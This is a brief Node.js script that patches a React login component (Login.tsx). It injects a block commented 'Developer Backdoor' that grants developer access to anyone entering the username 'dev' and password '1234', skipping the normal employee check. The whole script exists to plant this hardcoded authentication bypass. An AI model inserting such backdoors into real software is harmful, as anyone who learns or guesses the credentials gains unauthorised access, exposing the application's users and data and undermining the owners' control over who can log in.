const fs = require('fs');
let login = fs.readFileSync('src/components/Login.tsx', 'utf8');

const devLogic = `
    // Developer Backdoor
    if (un === 'dev' && password === '1234') {
      onLogin('developer', 'dev');
      if (rememberMe) {
        localStorage.setItem('rememberedUser', 'dev');
      } else {
        localStorage.removeItem('rememberedUser');
      }
      return;
    }
    
    // Find employee`;

login = login.replace(
  "// Find employee",
  devLogic.trim()
);

fs.writeFileSync('src/components/Login.tsx', login);
